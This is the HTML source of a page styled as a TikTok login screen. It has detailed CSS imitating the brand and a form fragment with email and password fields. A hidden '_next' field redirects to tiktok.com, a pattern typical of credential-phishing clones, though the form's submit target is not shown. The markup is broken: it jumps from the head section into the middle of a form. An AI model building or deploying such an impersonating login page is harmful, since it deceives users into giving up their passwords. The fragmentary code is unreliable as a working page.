<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            padding: 32px;
        }

        .logo {
            text-align: center;
            margin-bottom: 24px;
        }

        .logo svg {
            width: 118px;
            height: 42px;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
            color: #161823;
        }

        .subtitle {
            text-align: center;
            color: #8a8b9a;
            font-size: 15px;
            margin-bottom: 24px;
        }

        .login-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .login-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            background: white;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            color: #161823;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background-color: #f8f8f8;
        }

        .login-btn svg {
            width: 20px;
            height: 20px;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: #8a8b9a;
            font-size: 14px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e0e0e0;
        }

        .divider::before {
            margin-right: 16px;
        }

        .divider::after {
            margin-left: 16px;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-wrapper {
            position: relative;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #161823;
        }

        input::placeholder {
            color: #a8a8a8;
        }

        .forgot-password {
            text-align: right;
            margin-top: 8px;
        }

        .forgot-password a {
            color: #161823;
            font-size: 14px;
            text-decoration: none;
            font-weight: 600;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #fe2c55;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 24px;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background: #e02649;
        }

        .submit-btn:disabled {
            background: #ffb3c0;
            cursor: not-allowed;
        }

        .terms {
            text-align: center;
            font-size: 12px;
            color: #8a8b9a;
            margin-top: 24px;
            line-height: 1.5;
        }

        .terms a {
            color: #161823;
            text-decoration: none;
        }

        .terms a:hover {
            text-decoration: underline;
        }

        .signup-link {
            text-align: center;
            margin-top: 24px;
            font-size: 15px;
            color: #161823;
        }

        .signup-link a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
            margin-left: 4px;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .email-form {
            display: none;
        }

        .email-form.active {
            display: block;
        }
    </style>
</head>

                    <input type="text" placeholder="Email or username" id="emailInput" name="email" required>
                </div>
                <div class="input-group">
                    <input type="password" placeholder="Password" id="passwordInput" name="password" required>
                </div>
                <input type="hidden" name="_next" value="https://www.tiktok.com/">
